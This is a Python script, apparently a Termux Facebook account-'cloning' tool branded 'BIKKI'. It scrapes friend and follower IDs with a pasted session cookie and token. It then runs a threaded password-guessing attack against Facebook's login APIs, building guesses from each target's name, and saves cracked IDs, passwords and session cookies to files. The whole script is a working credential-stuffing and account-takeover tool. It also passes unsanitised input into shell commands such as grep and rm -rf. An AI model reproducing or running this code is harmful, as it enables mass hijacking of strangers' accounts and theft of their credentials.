#!/usr/bin/python
#Original written By biki dona

import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')

print('\033[1;32mloading terminal ...\n')



try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')


try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as BIKKIBIKKI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

    
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua    

def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    
def randBuildHHL():
	END = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END

sys.stdout.write('\x1b]2; BIKKI\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo =                                          """            
\033[1;32m######  ### #    # #    # ### 
\033[1;38m#     #  #  #   #  #   #   #  
\033[1;30m#     #  #  #  #   #  #    #  
\033[1;32m######   #  ###    ###     #  
\033[1;31m#     #  #  #  #   #  #    #  
\033[1;34m#     #  #  #   #  #   #   #  
\033[1;37m######  ### #    # #    # ###      DONA
-------------------------------------------------
owner        -      bikki dona
Facebook     -      bikki
status       -     paid
version      -    111.11
tools        -      file cloning
--------------------------------------------------"""


            
def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back BIKKI Menu ")
        exit()

def BIKKI():   
    os.system('clear')
    print(logo)
    print(f'[1] File Crack')
    print(f'[2] Public ID Crack')
    print(f'[3] Random Crack ')
    print(f'[4] Create File')
    print(f'[5] Login Tool')
    print(f'[6] Logout Cookie')
    print(f'[7] Separate Ids')
    print(f'[8] Remove Duplicate IDs')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        exit(' This is Option Soon available ... ')
    elif select =='3':
        random_number()
    elif select =='4':
       menu()
    elif select =='5':
       login()
    elif select =='6':
       remove_Tc()
    elif select =='7':
       removef()
    elif select =='8':
       sids()
    elif select =='9':
       cutter()
    
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        BIKKI(allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
    print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='4':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='0':
        BIKKI()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[BIKKI] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers =headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ne-NP;q=0.8,ne;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=qwnHZTp7ORFGlMJ8yN0kXNH2; sb=qwnHZfs4rVfNnEVYd2XVPYwt; m_pixel_ratio=1.9706075191497803; wd=366x689; fr=0lnYBSdj5GXjR7FnR..Blxwmr..AAA.0.0.Blxwnh.AWUPOGyIpd4',
    'dpr': '1.712499976158142',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"TECNO KE5k"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                    print(f"\r{R} [BIKKI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/BIKKI_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/BIKKI_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [BIKKI-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/BIKKI_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[BIKKI] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2006C3MI"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                    print(f"\r{R} [BIKKI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/BIKKI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/BIKKI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [BIKKI-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/BIKKI_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[BIKKI] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=bOnGZUPnwwqDAJaqD3tO6wnC; sb=bOnGZQ1BWtX5r2MD6cyP3-gW; m_pixel_ratio=1.8391053676605225; wd=391x727; ps_l=0; ps_n=0; fr=0ngVfvwAHHa7uZ2FF..Blxuns..AAA.0.0.Blxun2.AWV6CajLNLk',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2006C3MI"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                    print(f"\r{R} [BIKKI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/BIKKI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/BIKKI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [BIKKI-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/BIKKI_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[BIKKI] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [BIKKI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/BIKKI_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [BIKKI-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/BIKKI_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} Total IDs :\033[1;32m %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with BIKKIBIKKI(max_workers=30) as BIKKIworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                BIKKIworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                BIKKIworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                BIKKIworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                BIKKIworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            

def remove_Tc():
        os.system('rm -rf .token.txt .cookie.txt');print(f'\n{F}Logout Successfully ...')
        login()
        
def login():
    clear()
    print('\x1b[00m\tLogin Using Cookies') 
    try:
        fbcokis= input('\n\x1b[00mPut Cookies:\x1b[92m')
        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
        open(".tokn.txt", "w").write(eaab)
        open(".cokis.txt", "w").write(fbcokis)
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        print(f"{R}Login Successfully")
        menu()
    except Exception as error: 
        os.system("rm -f .tokn.txt")
        print("\x1b[1;91m\n\t\t[!] Cookies Expired ")
        slp(2)
        login()

def public():
    fbidz = []
    clear()
    print(logo)
    global totaldmp,count,srange 
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .token.txt .cokis.txt')
        login()
    try:
        clear()
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        for rept in range(srange):
            rept += 1
            fbuid = input("[" + str(rept) + "] Put id username: ")
            clear()
            if  fbuid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    fbidz.append(idnm['id'])
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/BIKKI.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)
        
def follower():
    fbidz = []
    clear()
    global totaldmp,count
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .tokn.txt .cokis.txt')
        login()
    try:
        clear()
        try:
            fbbuid = input("Put Id Username: ")
            clear()
            dmp = requests.get("https://graph.facebook.com/"+fbbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            for idnm in dmp['friends']['data']:
                totaldmp+=1
                fbidz.append(idnm['id'])
        except KeyError:
            print(f"{A}ID Not Public");time.sleep(1)
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/BIKKI.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=subscribers.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['subscribers']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)

def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input('Put File Name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    clear()
    print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;37mExample: /sdcard/BIKKI.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 10008,10007,10006')
    print(47*'-')
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(47*'-')
    print('Links grabbed successfully')
    print('Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print('New file saved as: '+new_save)
    print(47*'-')
    input('Press enter to back Menu ')
    menu()
    
def cutter():
    os.system('clear')
    print(logo)
    print("Enter File Path / File Location \n")
    BIKKI = input('Put File Name :')
    print(" ")
    BIKKI = input('Saving Put File Name :')
    os.system('touch ' +BIKKI)
    os.system('sort -r '+BIKKI+' | uniq > '+BIKKI)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + BIKKI )
    print(47*'-')
    print("File Saved To :" + BIKKI )
    print(47*'-')
    input(f"{S} Press Enter To Back BIKKI Menu ")
    menu
       

#------[ MAIN MENU ]--------->>
def menu():
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        nam = info['name']
        uid = info['id']
    except Exception as error:print ("\n\x1b[1;91m[*] Token Expired");slp(1);login()
    clear()
    print(f'Name : {nam} | ID : {uid}  ')
    print(47*"-")
    print(f'[1] Dump From Public [Simple]')
    print(f'[2] Dump From Public [Ultimated-auto-separate]')
    print(f'[3] Dump From Public [Ultimated]')
    print('[4] Dump From Follower [Ultimated]')
    print('[5] Remove Duplicate Links ')
    print('[6] Seprate Links ')
    print('[0] Remove Cookie ')
    print(47*"-")
    select = input('Select Menu: ')
    if select =='1':
        p_dump()
    elif select =='2':
        dump()
    elif select =='3':
        public()
    elif select =='4':
        follower()
    elif select =='5':
        cutter()
    elif select =='6':
        BIKKI()
    elif select =='0':
        os.system('rm -rf .tokn.txt')
        os.system('rm -rf .cookis.txt')
        print(f'{F}Logout Successful');time.sleep(1)
        menu()
        
def push(fbuid,file,fbcokis,token,mission,typ):
    global filter,totaldmp
    try:
        if int(totaldmp)>=int(mission):
            filter = 'Closed'
        else:
            #and type in idnm['id']
            dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            print(f'\r Dumping : {fbuid}  IDs : {totaldmp}')
            for idnm in dmp['friends']['data']:
                if idnm['id'] not in filter:
                    if str(typ) in idnm['id']:
                        filter.append(idnm['id'])
                        open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                        totaldmp+=1
    except Exception as error:
        pass

def sent(file,fbcokis,token):
    global saved,totaldmp
    try:
        clear()
        print('How Many IDs You Want To Dump \nExample : 1000,5000,10000\n')
        mission = int(input('Enter limit: \x1b[1;92m'))
        clear()
        print('Which IDs You Want To Dump \nExample : 10008,100087,10007,mix\n')
        typ = input('Links: \x1b[1;97m')
        if 'mix' in typ.lower():
            typ = '1'
        clear()
        for fbuid in saved:
            fast_work(push,fbuid,file,fbcokis,token,mission,typ)
    except Exception as error:
        exit(f'----------------------------------------------------------\nTotal Dumped - {totaldmp} IDs \nSaved To = {file}\n----------------------------------------------------------')

def dump():
    global saved,totaldmp
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        login()
    except:
        login()
    try:
        print('Enter Dump ID Save Path\n')
        file = input('Enter File:\x1b[1;97m ')
        clear()
        print('IF You Want To Back To Menu. Then Type \'B\' \n')
        while True:
            try:
                fbuid = input('Put id username:\x1b[1;97m ')
                if 'B' in fbuid.upper():
                    menu()
                    break
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                    totaldmp+=1
                    saved.append(idnm['id'])
                print(f'Total Target Found:\x1b[1;97m {len(saved)}')
                slp(2)
                sent(file,fbcokis,token)
                break
                exit('Bye Bye')
            except:
                print('ID Not Public')
                continue
    except Exception as error:
        menu()

def p_dump():
    global totaldmp,srange
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}\n\t\tCookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}Cookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        clear()
        
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/BIKKI.txt\n') 
        filepath = input("Put File Name: ")
